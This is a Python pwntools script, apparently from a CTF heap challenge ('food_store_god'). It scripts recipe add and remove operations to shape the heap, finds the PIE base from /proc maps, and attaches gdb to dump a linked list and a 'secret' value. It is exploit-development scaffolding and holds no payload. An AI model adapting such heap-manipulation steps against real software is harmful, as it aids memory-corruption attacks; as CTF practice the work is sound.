import sys,os,subprocess; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
os.environ['LOG']='error'
from pwn import *
DIR='/mnt/c/Users/ha/Downloads/pwn'
env={'LD_LIBRARY_PATH':DIR,'LD_PRELOAD':DIR+'/ptracer.so'}
p=process([DIR+'/ld-2.24.so','--library-path',DIR,DIR+'/food_store_god'],env=env)
def ru(x,**k): return p.recvuntil(x,**k)
def sl(x): p.sendline(x if isinstance(x,bytes) else str(x).encode())
ru(b'Your name: '); sl(b'AAAA')
def add(title, ing=b'0'):
    ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'1')
    ru(b'Magic : '); m=p.recvline().strip()
    ru(b'Title :'); sl(title)
    ru(b'Choose ingredient :'); sl(ing)
    ru(b'Add more ingredient ? (1/Yes,2/No) : '); sl(b'2')
    ru(b'Your choice: '); sl(b'4'); return m
def make(nm):
    ru(b'Your choice: '); sl(b'4'); ru(b'Your choice: '); sl(b'3')
    ru(b'Ingredient :'); sl(nm); ru(b'Your choice: '); sl(b'4')
def remove(title):
    ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'2')
    ru(b'Title :'); sl(title); ru(b'Your choice: '); sl(b'4')
add(b'RRRRRRRR'); make(b'bar1'); add(b'FFFFFFFF'); make(b'bar2')
remove(b'RRRRRRRR'); remove(b'FFFFFFFF'); add(b'NEWRECIPE')
ru(b'Your choice: ')
pid=p.pid
base=None
for line in open('/proc/%d/maps'%pid):
    if line.rstrip().endswith('food_store_god'):
        base=int(line.split('-')[0],16); break
heads=base+0x2050d0; sec=base+0x2050d8
body=r'''import gdb
inf=gdb.inferiors()[0]
def rq(a): return int.from_bytes(inf.read_memory(a,8).tobytes(),'little')
HEAD=_HEAD_
print("recipes_head="+hex(rq(HEAD)))
print("secret="+hex(rq(_SEC_)))
n=rq(HEAD)
for i in range(12):
  if n==0:
    print("  NULL end"); break
  try: d=inf.read_memory(n,0x88).tobytes()
  except Exception as e:
    print("  node "+hex(n)+" UNREADABLE"); break
  print("  node="+hex(n)+" title="+repr(d[:16])+" +0x18="+hex(int.from_bytes(d[0x18:0x20],'little'))+" next="+hex(int.from_bytes(d[0x80:0x88],'little')))
  n=int.from_bytes(d[0x80:0x88],'little')
'''.replace('_HEAD_',str(heads)).replace('_SEC_',str(sec))
open('/tmp/gg.py','w').write(body)
out=subprocess.run(['gdb','-q','-nx','-batch','-p',str(pid),'-ex','set pagination off',
  '-ex','source /tmp/gg.py','-ex','detach','-ex','quit'],capture_output=True,text=True)
print("PIEBASE="+hex(base))
print(out.stdout)
print("ERR:",out.stderr[-300:])
p.close()
